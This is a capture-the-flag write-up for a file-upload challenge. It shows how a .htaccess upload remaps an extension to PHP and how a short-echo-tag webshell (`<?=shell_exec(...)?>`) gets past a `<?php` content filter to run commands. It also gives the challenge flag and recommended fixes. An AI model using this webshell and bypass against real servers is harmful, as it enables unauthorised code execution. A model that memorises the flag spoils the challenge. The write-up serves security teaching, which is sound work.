# 06 · upload-htaccess (medium/hard)

A gallery stores uploads under `/uploads/` and rejects PHP extensions (`.php`,
`.phtml`, `.phar`, …). It's an extension blacklist, and the upload directory runs
with `AllowOverride All`, so Apache honours a `.htaccess` placed there. On top of
that, the uploader **reads the file's bytes** and rejects anything containing the
token `<?php`.

## Two layers to break

1. **Extension blacklist** — misses `.htaccess` and any invented extension like
   `.xyz`. A `.htaccess` lets you remap an extension to the PHP engine.
2. **Content filter** — a plain `<?php … ?>` webshell is blocked even with a good
   extension, because the server scans the bytes for `<?php`.

The first layer alone is the classic "upload a `.htaccess`" trick. The second
layer kills the obvious payload and forces a PHP open-tag that the filter never
accounts for.

## Exploitation
1. Upload a `.htaccess` (not on the blacklist, contains no `<?php`):
   ```
   AddType application/x-httpd-php .xyz
   ```
2. Upload `shell.xyz`. A normal `<?php system(...) ?>` is rejected by the content
   filter, so use PHP's **short echo tag** `<?=`, which is always on in PHP 8 and
   contains no `<?php`:
   ```php
   <?=shell_exec($_GET["c"])?>
   ```
3. Execute:
   ```
   GET /uploads/shell.xyz?c=cat%20/flag.txt
   ```
See `solve/solve.sh`.

## Flag
```
SecurinetsENIT{sh0rt_3ch0_t4g_sl1ps_p4st_th3_php_f1lt3r}
```

## Fix
Allow-list extensions instead of blacklisting; validate content against the
claimed type rather than string-matching for `<?php` (short tags, `<script>`
blocks and other engines all slip past substring filters); set
`AllowOverride None` and strip execute handlers on the upload directory; store
uploads outside the webroot or on a host that never executes them.

## Relationship to the "v1" variant
This is the hardened **v2**. The v1 form of this bug (e.g. the PaperTrail
challenge) has only the extension blacklist and no content scan, so a `.htaccess`
plus a plain `<?php` shell is enough. v2 adds the content filter, which makes the
plain shell fail and forces the short-echo-tag bypass as a distinct second step.
